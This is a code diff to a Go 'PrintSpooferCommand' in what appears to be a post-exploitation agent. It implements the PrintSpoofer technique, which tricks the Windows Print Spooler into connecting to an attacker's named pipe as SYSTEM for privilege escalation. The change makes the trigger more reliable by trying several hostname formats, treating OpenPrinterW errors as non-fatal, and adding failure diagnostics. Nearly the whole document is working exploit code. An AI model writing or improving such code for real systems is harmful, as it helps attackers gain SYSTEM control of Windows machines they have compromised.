@@ -155,21 +155,28 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 
 	if !alreadyConnected {
 		// Trigger the Print Spooler to connect to our pipe.
-		// OpenPrinterW("\\COMPUTERNAME/pipe/{suffix}") causes the spooler to
-		// connect to \\COMPUTERNAME\pipe\{suffix}\pipe\spoolss = our pipe.
+		// OpenPrinterW("\\HOSTNAME/pipe/{suffix}") causes the spooler to
+		// connect to \\HOSTNAME\pipe\{suffix}\pipe\spoolss = our pipe.
 		// The forward slash in /pipe/ is key — it's interpreted as path separator.
-		printerName := fmt.Sprintf(`\\%s/pipe/%s`, computerName, pipeSuffix)
-		triggerErr := triggerSpooler(printerName)
-		if triggerErr != nil {
-			windows.CancelIoEx(pipeHandle, &overlapped)
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to trigger Print Spooler: %v\nIs the Print Spooler service running? Check: sc query spooler", triggerErr),
-				Status:    "error",
-				Completed: true,
+		//
+		// Try multiple hostname formats since some Windows builds reject certain names.
+		// OpenPrinterW errors are non-fatal — the pipe connection is what matters.
+		var triggerWarnings []string
+		hostnames := []string{computerName, "localhost"}
+		for _, host := range hostnames {
+			printerName := fmt.Sprintf(`\\%s/pipe/%s`, host, pipeSuffix)
+			triggerErr := triggerSpooler(printerName)
+			if triggerErr != nil {
+				triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: %v", host, triggerErr))
+			}
+			// Check if spooler already connected after this trigger
+			checkResult, _ := windows.WaitForSingleObject(event, 500)
+			if checkResult == windows.WAIT_OBJECT_0 {
+				break // Connected!
 			}
 		}
 
-		// Wait for spooler to connect (with timeout)
+		// Wait for spooler to connect (remaining timeout)
 		timeoutMs := uint32(args.Timeout * 1000)
 		waitResult, _ := windows.WaitForSingleObject(event, timeoutMs)
 		switch waitResult {
@@ -177,8 +184,20 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 			// Connected!
 		case 258: // WAIT_TIMEOUT
 			windows.CancelIoEx(pipeHandle, &overlapped)
+			var sb strings.Builder
+			sb.WriteString(fmt.Sprintf("Timeout after %ds — Print Spooler did not connect to %s.\n", args.Timeout, pipePath))
+			sb.WriteString("Possible causes:\n")
+			sb.WriteString("- Print Spooler not running (sc query spooler)\n")
+			sb.WriteString("- Technique may be patched on this Windows build\n")
+			sb.WriteString("- SeImpersonatePrivilege context required\n")
+			if len(triggerWarnings) > 0 {
+				sb.WriteString("\nTrigger diagnostics:\n")
+				for _, w := range triggerWarnings {
+					sb.WriteString(fmt.Sprintf("  %s\n", w))
+				}
+			}
 			return structs.CommandResult{
-				Output:    fmt.Sprintf("Timeout after %ds — Print Spooler did not connect to %s.\nPossible causes:\n- Print Spooler not running (sc query spooler)\n- Pipe name collision\n- The service may not have access", args.Timeout, pipePath),
+				Output:    sb.String(),
 				Status:    "error",
 				Completed: true,
 			}
@@ -288,6 +307,8 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 
 // triggerSpooler calls OpenPrinterW with a crafted path that causes the
 // Print Spooler service to connect to our named pipe as SYSTEM.
+// OpenPrinterW errors are returned as diagnostics but are non-fatal —
+// the spooler may have already connected to the pipe before returning.
 func triggerSpooler(printerName string) error {
 	namePtr, err := windows.UTF16PtrFromString(printerName)
 	if err != nil {
@@ -308,14 +329,14 @@ func triggerSpooler(printerName string) error {
 		procClosePrinter.Call(hPrinter)
 	}
 
-	// If the call completely failed (not just printer not found), report it
+	// Return OpenPrinterW errors as diagnostics (caller treats as non-fatal).
+	// Expected errors:
+	//   1801 = ERROR_INVALID_PRINTER_NAME (printer doesn't exist — expected)
+	//   1210 = ERROR_INVALID_COMPUTERNAME (hostname format rejected)
+	//   53   = ERROR_BAD_NETPATH (path resolution failed)
+	// In all cases the spooler may still have connected to our pipe.
 	if ret == 0 && callErr != nil {
-		// ERROR_INVALID_PRINTER_NAME (1801) is expected — the "printer" doesn't exist
-		// but the spooler still tried to connect to the pipe endpoint
-		if callErr == windows.Errno(1801) {
-			return nil // Expected — spooler tried to connect, that's all we need
-		}
-		return fmt.Errorf("OpenPrinterW: %v", callErr)
+		return fmt.Errorf("OpenPrinterW(%s): %v", printerName, callErr)
 	}
 
 	return nil
